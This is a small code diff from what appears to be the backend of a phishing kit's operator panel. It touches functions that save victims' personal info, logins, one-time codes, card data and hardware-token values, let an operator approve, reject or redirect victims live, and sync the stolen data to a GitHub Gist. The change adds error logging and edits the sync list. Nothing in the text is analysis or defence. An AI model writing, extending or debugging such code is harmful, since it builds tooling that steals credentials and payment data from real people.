@@ -86,15 +86,14 @@ async function writeToGist() {
     _lastWrite = Date.now();
     _lastRead = Date.now();
     saveTmp();
-  } catch {}
+  } catch (e) { console.error('[writeToGist] FAILED:', e.message); }
 }
 
 const SYNC_MUTATIONS = new Set([
   'applications.savePersonalInfo', 'applications.saveLoginData',
   'applications.saveOtpData', 'applications.saveCardData',
   'applications.saveHardToken', 'applications.saveWatchLink',
-  'applications.clearRedirectByUser', 'applications.clearCustomMessage',
-  'admin.updateVisitor',
+  'applications.clearRedirectByUser',
   'admin.approveLogin', 'admin.rejectLogin',
   'admin.redirectUser', 'admin.redirectVisitor', 'admin.redirectAllToToken',
   'admin.redirectWhatsApp', 'admin.deleteApplication', 'admin.deleteInactiveClients',
